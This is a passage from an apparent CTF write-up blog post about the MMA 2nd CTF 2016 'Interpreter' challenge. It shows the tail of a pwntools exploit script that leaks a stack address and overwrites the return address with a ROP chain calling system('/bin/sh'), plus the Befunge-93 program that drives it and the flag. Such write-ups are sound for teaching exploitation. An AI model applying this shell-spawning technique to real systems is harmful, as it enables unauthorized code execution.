"</span>+hex(LD.symbols[<span class="string">'__libc_stack_end'</span>]))</span><br><span class="line">    stack_addr = leak_far_addr(LD.symbols[<span class="string">'__libc_stack_end'</span>], text_base, <span class="string">"stack addr"</span>)</span><br><span class="line">    log.info(<span class="string">"stack_addr: "</span>+hex(stack_addr))</span><br><span class="line">    </span><br><span class="line">    pop_rdi = text_base + <span class="number">0x000000000000120c</span></span><br><span class="line">    ret_addr = stack_addr - <span class="number">216</span></span><br><span class="line">    log.info(<span class="string">"ret_addr: "</span>+hex(ret_addr))</span><br><span class="line">    log.info(<span class="string">"pop_rdi: "</span>+hex(pop_rdi))</span><br><span class="line">    log.info(<span class="string">"bin_sh: "</span>+hex(bin_sh))</span><br><span class="line">    log.info(<span class="string">"system: "</span>+hex(system))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite return address</span></span><br><span class="line">    write_far_addr(ret_addr, text_base, <span class="string">"ret_addr"</span>, pop_rdi)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">8</span>, text_base, <span class="string">"ret_addr+8"</span>, bin_sh)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">16</span>, text_base, <span class="string">"ret_addr+16"</span>, system)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p><code>bbb</code> is the Befunge-93 program I used to exploit the service :<br><figure class="highlight plain"><figcaption><span>bbb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;                                    v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.            v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;                                    ^</span><br></pre></td></tr></table></figure></p>
<p>flag : <code>TWCTF{It_1s_eMerG3nCy}</code>  </p>
<p>After I pass the challenge and ask a girl from HITCON CTF team, she told me that there’s a symbol call <code>environ</code> in libc, which also store a stack address! And that’s the moment I realized I totally forgot to search the stack address in libc while debugging the program!<br>So the (way) more elegant way to solve this challenge is to leak the stack address via the <code>environ</code> symbol after we leak the libc’s base address. Guess I’ve still got a lot to learn in the pwn area :P</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
          
            <a href="/tags/Python/" rel="tag"># Python</a>
          
            <a href="/tags/MMA/" rel="tag"># MMA</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2016/09/12/2016-09-12-mma-2nd-ctf-2016-greeting/" rel="next" title="MMA 2nd CTF 2016 -- greeting">
                <i class="fa fa-chevron-left"></i> MMA 2nd CTF 2016 -- greeting
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2016/09/13/2016-09-13-asis-ctf-finals-2016-car-market/" rel="prev" title="ASIS CTF Finals 2016 -- car market">
                ASIS CTF Finals 2016 -- car market <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
        <!-- Go to www.addthis.com/dashboard to customize your tools -->
<div class="addthis_inline_share_toolbox">
  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
</div>

      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
               alt="Bruce Chen" />
          <p class="site-author-name" itemprop="name">Bruce Chen</p>
           
              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">50</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">65</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/bruce30262" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
                  
                    <i class="fa fa-fw fa-facebook"></i>
                  
                  Facebook
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2017 - 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      Total visitors
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      Total views
    </span>
  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



  


  

    
      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://bruce30262.github.io/2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/';
          this.page.identifier = '2016/09/12/2016-09-12-mma-2nd-ctf-2016-interpreter/';
          this.page.title = 'MMA 2nd CTF 2016 -- Interpreter';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  













  





  

  

  

  

  

</body>
</html>
